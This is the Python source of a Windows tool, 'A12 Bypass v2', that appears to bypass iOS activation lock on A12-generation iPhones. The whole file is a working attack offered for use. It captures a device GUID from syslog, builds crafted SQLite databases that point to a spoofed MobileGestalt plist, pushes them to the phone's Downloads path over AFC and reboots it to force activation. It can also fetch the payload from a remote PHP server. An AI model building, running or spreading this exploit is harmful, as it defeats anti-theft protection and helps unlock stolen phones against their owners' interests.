"""
A12 Bypass OSS - Windows client (32-bit), v2

Changes vs v1:
  * LocalServer no longer calls os.chdir() -> relative paths stay valid
  * device picker (multiple devices / explicit UDID) + model-name display
  * asset fallback: iPhone11-8 -> -OLD -> -NEW -> case-insensitive scan
  * pre-flight asset check BEFORE the 30s reboot
  * GUID capture: 3-pass matcher + saves guid_capture.log on failure
  * iOS version sanity warning for A12 devices on iOS 17+
"""
import asyncio
import atexit
import binascii
import os
import re
import shutil
import socket
import sqlite3
import sys
import tempfile
import threading
import time
import zipfile
from functools import partial
from http.server import SimpleHTTPRequestHandler
from pathlib import Path
from socketserver import TCPServer

import requests

from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.services.diagnostics import DiagnosticsService
from pymobiledevice3.services.syslog import SyslogService
from pymobiledevice3.usbmux import list_devices

from payload_templates import BL_STRUCTURE_SQL, DOWNLOADS_STRUCTURE_SQL

SERVER_URL_PLACEHOLDER = "https://your-domain.com/index.php"
PAYLOAD_TARGET = "/Downloads/downloads.28.sqlitedb"
SYLOG_COLLECT_SECONDS = 180

# Display-only map. Does NOT affect behaviour: the tool always keys off the
# real ProductType value reported by the device.
MODEL_NAMES = {
    "iPhone11,2": "iPhone XS",
    "iPhone11,4": "iPhone XS Max",
    "iPhone11,6": "iPhone XS Max (China)",
    "iPhone11,8": "iPhone XR",
    "iPhone12,1": "iPhone 11",
    "iPhone12,3": "iPhone 11 Pro",
    "iPhone12,5": "iPhone 11 Pro Max",
    "iPhone12,8": "iPhone SE (2nd gen)",
    "iPhone13,1": "iPhone 12 mini",
    "iPhone13,2": "iPhone 12",
    "iPhone13,3": "iPhone 12 Pro",
    "iPhone13,4": "iPhone 12 Pro Max",
}

GUID_BEFORE = re.compile(
    r"SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-"
    r"[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})"
)
ANY_UUID = re.compile(
    r"([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})"
)


def app_dir() -> Path:
    if getattr(sys, "frozen", False):
        return Path(sys.executable).parent
    return Path(__file__).resolve().parent


def find_assets_root() -> Path:
    here = app_dir()
    for candidate in (here / "assets", here / "server" / "assets",
                      here.parent / "server" / "assets"):
        if (candidate / "Maker").is_dir():
            return candidate
    return here / "assets"


def enable_ansi():
    os.system("")
    if os.name == "nt":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            h = k32.GetStdHandle(-11)
            mode = ctypes.c_uint32()
            if k32.GetConsoleMode(h, ctypes.byref(mode)):
                k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass


class Style:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[0;31m"; GREEN = "\033[0;32m"; YELLOW = "\033[1;33m"
    BLUE = "\033[0;34m"; MAGENTA = "\033[0;35m"; CYAN = "\033[0;36m"


def clear():
    os.system("cls" if os.name == "nt" else "clear")


class LocalServer:
    """Serves payload files over LAN. Never changes the process CWD."""

    def __init__(self, port=8080):
        self.port = port
        self.serve_dir = tempfile.mkdtemp(prefix="ios_activation_")
        self.local_ip = self.get_local_ip()
        self.thread = None
        self.httpd = None

    @staticmethod
    def get_local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def start(self):
        handler = partial(SimpleHTTPRequestHandler, directory=str(self.serve_dir))
        self.httpd = TCPServer(("", self.port), handler)
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()
        print(f"{Style.DIM}  Local server: http://{self.local_ip}:{self.port}"
              f"  (from {self.serve_dir}){Style.RESET}")

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            self.httpd = None
        shutil.rmtree(self.serve_dir, ignore_errors=True)

    def get_file_url(self, filename):
        return f"http://{self.local_ip}:{self.port}/{filename}"


class PayloadGenerator:
    def __init__(self, server_root, asset_root):
        self.server_root = Path(server_root)
        self.asset_root = Path(asset_root)
        self.asset_used = None

    def resolve_asset(self, prd_safe):
        """iPhone11,8 -> Maker/iPhone11-8, with -OLD/-NEW fallback + case scan."""
        maker = self.asset_root / "Maker"
        for name in (prd_safe, f"{prd_safe}-OLD", f"{prd_safe}-NEW"):
            p = maker / name / "com.apple.MobileGestalt.plist"
            if p.is_file():
                return p, name
        target = prd_safe.lower()
        if maker.is_dir():
            for d in sorted(maker.iterdir()):
                if d.is_dir() and d.name.lower() == target:
                    p = d / "com.apple.MobileGestalt.plist"
                    if p.is_file():
                        return p, d.name
        return None, None

    @staticmethod
    def _create_db_from_sql(sql_content, output_path):
        try:
            def unistr_sub(match):
                content = match.group(1)
                decoded = re.sub(
                    r"\\([0-9A-Fa-f]{4})",
                    lambda m: binascii.unhexlify(m.group(1)).decode("utf-16-be", "replace"),
                    content)
                return f"'{decoded}'"
            sql_content = re.sub(r"unistr\s*\(\s*'([^']*)'\s*\)", unistr_sub,
                                 sql_content, flags=re.IGNORECASE)
            sql_content = re.sub(r"unistr\s*\(\s*('[^']*')\s*\)", r"\1",
                                 sql_content, flags=re.IGNORECASE)
            output_path = Path(output_path)
            if output_path.exists():
                output_path.unlink()
            conn = sqlite3.connect(str(output_path))
            conn.executescript(sql_content)
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            print(f"{Style.RED}DB generation error: {e}{Style.RESET}")
            return False

    def generate(self, prd, guid, sn, local_server):
        prd_safe = prd.replace(",", "-")
        plist_path, used = self.resolve_asset(prd_safe)
        if not plist_path:
            print(f"{Style.RED}[!] No MobileGestalt asset for '{prd_safe}'{Style.RESET}")
            print(f"{Style.DIM}    looked in: {self.asset_root / 'Maker'}{Style.RESET}")
            return None
        self.asset_used = used
        print(f"{Style.DIM}    asset: Maker/{used}/com.apple.MobileGestalt.plist{Style.RESET}")

        token1 = binascii.hexlify(os.urandom(8)).decode()
        fixedfile_name = f"fixedfile_{token1}"
        with zipfile.ZipFile(self.server_root / fixedfile_name, "w") as zf:
            zf.write(str(plist_path), "Caches/com.apple.MobileGestalt.plist")
        fixedfile_url = local_server.get_file_url(fixedfile_name)

        bl_sql = BL_STRUCTURE_SQL.replace("KEYOOOOOO", fixedfile_url)
        token2 = binascii.hexlify(os.urandom(8)).decode()
        bl_db_name = f"belliloveu_{token2}.png"
        if not self._create_db_from_sql(bl_sql, self.server_root / bl_db_name):
            return None
        bl_url = local_server.get_file_url(bl_db_name)

        dl_sql = DOWNLOADS_STRUCTURE_SQL.replace("https://google.com", bl_url)
        dl_sql = dl_sql.replace("GOODKEY", guid)
        token3 = binascii.hexlify(os.urandom(8)).decode()
        final_db = self.server_root / f"downloads_{token3}.sqlitedb"
        if not self._create_db_from_sql(dl_sql, final_db):
            return None
        return final_db


def pick_guid(lines):
    """3-pass matcher. Returns (guid, reason). Relaxed vs v1."""
    for line in lines:
        if "BLDatabaseManager" in line:
            m = GUID_BEFORE.search(line)
            if m:
                return m.group(1).upper(), "BLDatabaseManager + SystemGroup"
            m = ANY_UUID.search(line)
            if m:
                return m.group(1).upper(), "BLDatabaseManager + UUID"
    for line in lines:
        if "SystemGroup" in line:
            m = GUID_BEFORE.search(line)
            if m:
                return m.group(1).upper(), "SystemGroup path"
    for line in lines:
        low = line.lower()
        if "bookassetd" in low or "bldownload" in low or "booklibrary" in low:
            m = ANY_UUID.search(line)
            if m:
                return m.group(1).upper(), "bookservice UUID"
    return None, "not found"


class BypassAutomation:
    def __init__(self):
        self.lockdown = None
        self.device_info = {}
        self.guid = None
        self.api_url = SERVER_URL_PLACEHOLDER
        self.server = LocalServer()
        self.generator = PayloadGenerator(self.server.serve_dir, find_assets_root())
        atexit.register(self._cleanup)

    def log(self, msg, level="info"):
        if level == "info":
            print(f"{Style.GREEN}[+]{Style.RESET} {msg}")
        elif level == "error":
            print(f"{Style.RED}[!]{Style.RESET} {msg}")
        elif level == "warn":
            print(f"{Style.YELLOW}[~]{Style.RESET} {msg}")
        elif level == "step":
            print(f"\n{Style.BOLD}{Style.CYAN}" + "-" * 60 + f"{Style.RESET}")
            print(f"{Style.BOLD}{Style.BLUE}>> {msg}{Style.RESET}")
            print(f"{Style.CYAN}" + "-" * 60 + f"{Style.RESET}")
        elif level == "detail":
            print(f"{Style.DIM}   . {msg}{Style.RESET}")
        elif level == "success":
            print(f"{Style.GREEN}{Style.BOLD}[+ SUCCESS]{Style.RESET} {msg}")

    # ---------------- device ----------------

    def _devices(self):
        try:
            return asyncio.run(list_devices())
        except Exception as e:
            self.log(f"usbmuxd not reachable: {e}", "error")
            self.log("Install iTunes 12.10.11 (last 32-bit) or the 'Apple Devices' app.", "detail")
            return []

    def connect(self):
        self.log("Looking for connected iPhones...", "step")
        devs = self._devices()
        if not devs:
            self.log("No device found via USB.", "error")
            self.log("Check: data cable (not charge-only), unlocked phone, 'Trust' tapped.", "detail")
            return False

        print(f"{Style.BOLD}Found {len(devs)} device(s):{Style.RESET}")
        for i, d in enumerate(devs, 1):
            print(f"  {i}) {d.serial}   [{d.connection_type}]")

        chosen = devs[0]
        if len(devs) > 1:
            raw = input(f"{Style.YELLOW}Which device? [1-{len(devs)}, Enter=1]: {Style.RESET}").strip()
            if raw.isdigit() and 1 <= int(raw) <= len(devs):
                chosen = devs[int(raw) - 1]
        else:
            for d in devs:
                if d.connection_type == "USB":
                    chosen = d
                    break

        try:
            self.lockdown = create_using_usbmux(serial=chosen.serial, autopair=True)
        except Exception as e:
            self.log(f"Could not talk to {chosen.serial}: {e}", "error")
            return False

        info = {}
        for key in ("ProductType", "ProductVersion", "BuildVersion", "SerialNumber",
                    "UniqueDeviceID", "ActivationState", "ModelNumber"):
            try:
                info[key] = self.lockdown.get_value(None, key)
            except Exception:
                pass
        self.device_info = info

        pt = info.get("ProductType", "Unknown")
        pv = info.get("ProductVersion", "?")
        friendly = MODEL_NAMES.get(pt, "")
        print(f"\n{Style.BOLD}Device : {pt}"
              + (f"  ({friendly})" if friendly else "")
              + f"   iOS {pv}{Style.RESET}")
        print(f"{Style.BOLD}UDID   : {info.get('UniqueDeviceID', chosen.serial)}{Style.RESET}")
        print(f"{Style.BOLD}State  : {info.get('ActivationState', '?')}{Style.RESET}")

        self._sanity_checks(pt, pv)
        return True

    def _sanity_checks(self, pt, pv):
        try:
            major = int(str(pv).split(".")[0])
        except Exception:
            major = 0
        if pt in MODEL_NAMES and major >= 17:
            self.log(f"Heads-up: {MODEL_NAMES.get(pt, pt)} on iOS {pv} is outside the range "
                     "this tool's payload method was documented for (it targets the older "
                     "downloads.28.sqlitedb / BLDatabaseManager path).", "warn")
            self.log("It may still run, but success is not confirmed for iOS 17+.", "detail")
        if self.device_info.get("ActivationState") == "Activated":
            self.log("Device already reports Activated - nothing to do.", "warn")

        prd = pt.replace(",", "-")
        plist, used = self.generator.resolve_asset(prd)
        if plist:
            self.log(f"Asset ready: Maker/{used}  ({plist.stat().st_size} bytes)", "info")
        else:
            self.log(f"No asset folder for '{prd}' - payload cannot be built.", "error")

    def reboot_device(self):
        self.log("Rebooting device...", "step")
        DiagnosticsService(lockdown=self.lockdown).restart()
        time.sleep(30)

    # ---------------- GUID ----------------

    async def _collect(self, lines, deadline):
        service = SyslogService(lockdown=self.lockdown)
        async for line in service.watch():
            if isinstance(line, bytes):
                line = line.decode("utf-8", "replace")
            lines.append(line)
            if time.time() > deadline:
                return

    def get_guid(self):
        self.log(f"Collecting system logs (max {SYLOG_COLLECT_SECONDS}s) - "
                 "keep the phone on the Hello / activation screen...", "step")
        lines = []
        try:
            asyncio.run(self._collect(lines, time.time() + SYLOG_COLLECT_SECONDS))
        except (TimeoutError, KeyboardInterrupt):
            pass
        except Exception as e:
            self.log(f"Syslog stream ended: {e}", "warn")

        self.log(f"Captured {len(lines)} log lines.", "detail")
        guid, why = pick_guid(lines)
        if guid:
            self.log(f"GUID found via: {why}", "detail")
            return guid

        # Keep evidence so a failed run can be diagnosed.
        try:
            out = Path(app_dir()) / "guid_capture.log"
            out.write_text("\n".join(lines[-5000:]), encoding="utf-8")
            self.log(f"No GUID match. Last log lines saved to: {out}", "warn")
        except Exception:
            pass
        return None

    # ---------------- payload ----------------

    def push_payload(self, local_db_path):
        self.log("Uploading payload over USB (AFC)...", "step")
        afc = AfcService(lockdown=self.lockdown)
        try:
            afc.rm(PAYLOAD_TARGET)
        except Exception:
            pass
        afc.push(local_db_path, PAYLOAD_TARGET, progress_bar=False)
        self.log(f"Wrote {PAYLOAD_TARGET}", "detail")

    def run_offline(self):
        prd = self.device_info.get("ProductType", "")
        plist, used = self.generator.resolve_asset(prd.replace(",", "-"))
        if not plist:
            self.log("Aborting before reboot: no asset for this model.", "error")
            return False

        self.server.start()
        self.reboot_device()

        self.guid = self.get_guid()
        if not self.guid:
            self.log("Could not find the GUID.", "error")
            self.log("Leave the phone on Hello for a minute, then run again.", "detail")
            return False
        self.log(f"GUID: {self.guid}", "success")

        self.log("Building payload locally...", "step")
        final_db = self.generator.generate(
            prd, self.guid, self.device_info.get("SerialNumber", ""), self.server)
        if not final_db:
            return False
        self.log("Payload built.", "success")

        self.push_payload(final_db)
        self.log("Payload deployed. Rebooting...", "success")
        DiagnosticsService(lockdown=self.lockdown).restart()
        self.log("Server stays up 60s so the phone can fetch assets.", "info")
        time.sleep(60)
        print(f"\n{Style.GREEN}Done. The phone should activate after the reboot.{Style.RESET}")
        return True

    def run_server_mode(self):
        url = input(f"{Style.YELLOW}Server URL (Enter = {self.api_url}): {Style.RESET}").strip()
        if url:
            self.api_url = url
        if "your-domain.com" in self.api_url:
            self.log("Set the real URL where the PHP server is deployed first.", "error")
            return False
        self.reboot_device()
        self.guid = self.get_guid()
        if not self.guid:
            return False
        self.log(f"GUID: {self.guid}", "success")

        params = (f"prd={self.device_info.get('ProductType','')}"
                  f"&guid={self.guid}&sn={self.device_info.get('SerialNumber','')}")
        resp = requests.get(f"{self.api_url}?{params}", timeout=60)
        download_url = resp.text.strip()
        if not download_url.startswith("http"):
            self.log(f"Server error: {download_url[:200]}", "error")
            return False

        local_db = str(Path(tempfile.gettempdir()) / "downloads.28.sqlitedb")
        with requests.get(download_url, stream=True, timeout=300) as r:
            r.raise_for_status()
            with open(local_db, "wb") as f:
                for chunk in r.iter_content(1024 * 256):
                    f.write(chunk)

        conn = sqlite3.connect(local_db)
        ok = conn.execute("SELECT count(*) FROM sqlite_master "
                          "WHERE type='table' AND name='asset'").fetchone()[0]
        conn.close()
        if not ok:
            self.log("Invalid payload (no 'asset' table).", "error")
            return False

        self.push_payload(local_db)
        DiagnosticsService(lockdown=self.lockdown).restart()
        print(f"\n{Style.GREEN}Done. The phone should activate after the reboot.{Style.RESET}")
        return True

    # ---------------- entry ----------------

    def run(self):
        enable_ansi()
        clear()
        print(f"{Style.BOLD}{Style.MAGENTA}A12 Bypass - Windows Edition v2{Style.RESET}")
        print(f"{Style.DIM}offline mode: no PHP server needed{Style.RESET}\n")

        if not self.connect():
            return
        if not (self.generator.asset_root / "Maker").is_dir():
            self.log(f"assets/Maker not found under {self.generator.asset_root}", "error")
            return

        input(f"{Style.YELLOW}Press Enter to start...{Style.RESET}")
        try:
            if self.mode_menu() == "1":
                self.run_offline()
            else:
                self.run_server_mode()
        finally:
            self._cleanup()

    @staticmethod
    def mode_menu():
        print(f"\n{Style.BOLD}Mode:{Style.RESET}")
        print(f"  {Style.CYAN}1{Style.RESET}) Offline (build payload on this PC)")
        print(f"  {Style.CYAN}2{Style.RESET}) Server mode (PHP backend)")
        return input(f"{Style.YELLOW}Choice [1/2]: {Style.RESET}").strip()

    def _cleanup(self):
        try:
            self.server.stop()
        except Exception:
            pass


def main():
    while True:
        try:
            BypassAutomation().run()
        except KeyboardInterrupt:
            print("\nInterrupted.")
        again = input(f"\n{Style.YELLOW}Run again? [y/N]: {Style.RESET}").strip().lower()
        if again != "y":
            break


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
    finally:
        if os.name == "nt" and getattr(sys, "frozen", False):
            try:
                input("\nPress Enter to exit...")
            except Exception:
                pass
